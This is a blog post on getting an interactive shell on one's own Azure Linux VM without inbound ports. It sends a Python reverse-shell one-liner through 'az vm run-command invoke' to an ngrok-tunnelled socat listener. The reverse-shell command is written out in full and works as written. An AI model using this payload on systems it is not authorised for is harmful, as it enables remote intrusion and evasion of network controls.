---
layout: post
title: "Reverse shell to your Azure VM without inbound access"
date: 2021-02-23
tags: azure linux
favorite: "true"
permalink: reverse-shell-azure
---

> **Purpose:** 
> For any Azure Compute Linux VM where you have permission to execute one-off commands via the Azure CLI, 
> issues a reverse shell command to the VM and sends the shell back to you over TCP (via an ngrok tunnel)

There are many practical reasons - whether due to cost constraints or lack of necessity - to not attach a public IP address/allow inbound acccess to an Azure Compute VM.  Nevertheless, once in a while it may be convenient to get a shell on a VM to tweak a setting or debug a problem. One solution would be to simply attach a public IP to the VM. In an ad-hoc situation, the solution I propose below is quick and easy once you have the tools set up. 

This solution aims to **replace** scenarios where you'd want to use the Azure dashboard's [integrated serial console](linux-diagnose-agent.md#azure-console).  To use the serial console, you needed to jump through several hoops and interface with the (buggy and not-too-fun-to-use) web console. This approach uses the Azure CLI's ability to [issue one-off shell commands to the VM](https://docs.microsoft.com/en-us/azure/virtual-machines/linux/run-command).  We are exploiting that feature to create a reverse shell back to our computer through a TCP connection.  We use ngrok to expose a TCP port on our local machine.

> Note that in this post I don't go through the process of setting up an encrypted TCP connection between your machine and the VM.  Following [this post by erev0s](https://erev0s.com/blog/encrypted-bind-and-reverse-shells-socat/#encrypted-reverse-shell) illustrates one such way to encrypt your connection with on an SSL layer.

## How it works

For an Azure VM with OUTBOUND internet access, but with NO INBOUND ports open - the script:

1. Spawns an ngrok TCP relay over local port 56760
2. Spawns a socat tcp listener on port 56760

Essentially: 

```bash
ngrok tcp 56760
socat file:`tty`,raw,echo=0 tcp-listen:56760
```

2. Does some regex magic to find out the random ngrok URL and port

3. Uses the Azure CLI to send a shell command to our VM with [az vm run-command invoke](https://docs.microsoft.com/en-us/cli/azure/vm/run-command?view=azure-cli-latest#az_vm_run_command_invoke).
4. The payload is a standard python reverse shell one-liner that makes a connection back to our listener, and spawning a `pty` with the command `/bin/bash`.

```bash
az vm run-command invoke -g $RESOURCE_GROUP -n $VMID --command-id RunShellScript --scripts "export RHOST=\"$HOST\";export RPORT=$PORT;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'"
```

### Prereqs

| Prereq.   | MacOS Install          | WSL2 Install                                                           |
|-----------|------------------------|------------------------------------------------------------------------|
| socat     | `brew install socat`     | `sudo apt install socat`                                                 |
| ngrok     | `brew install ngrok`     | `wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip -O ngrok.zip && unzip ngrok  && sudo cp ngrok /usr/local/bin && chown $(whoami) /usr/local/bin/ngrok && chmod +x /usr/local/bin/ngrok` |
| Azure CLI | `brew install azure-cli` | `curl -sL https://aka.ms/InstallAzureCLIDeb \| sudo bash`                |
| jq        | `brew install jq`        | `sudo apt install jq`                                                    |

### Additional Setup

1. Create a free ngrok account and run `ngrok authtoken <YOUR TOKEN>` in order to use their tcp relay.
2. Run `az login` to login to the Azure CLI with your credentials. 

## Usage

To use the script on a *nix system, simply run the bash script with your VM's name, resource group, and subscription.  Note you'll need this VM to be visible to you via the Azure CLI with adequate permissions to queue a `run-command`.

Two terminals will be spawned:
 - The `socat` listener window (listening for the reverse shell connection/where we will interact with our Azure VM). 
 - The `ngrok` window running the TCP tunnel facilitating the connection (you can mostly ignore this window, given you do not see an error).

```
./reverse-shell-azure.sh <VM NAME> [RESOURCE_GROUP] [SUBSCRIPTION]
```

----

You can clone the entire [**reverse-shell-azure.sh**](https://gist.github.com/joshspicer/b5c66ad239031e3138469c5948c78bae#file-reverse-shell-azure-sh) from this gist.

Make sure to place the following [revshell.ngrok.yml](https://gist.github.com/joshspicer/b5c66ad239031e3138469c5948c78bae#file-revshell-ngrok-yml) next to the script when executing

```yaml
tunnels:
  reverseshell:
    addr: 56760
    proto: tcp
```

<!-- I'd embed this gist, but embedding gists on this blog doesn't look that pretty  -->
<!-- <script src="https://gist.github.com/joshspicer/b5c66ad239031e3138469c5948c78bae.js"></script> -->
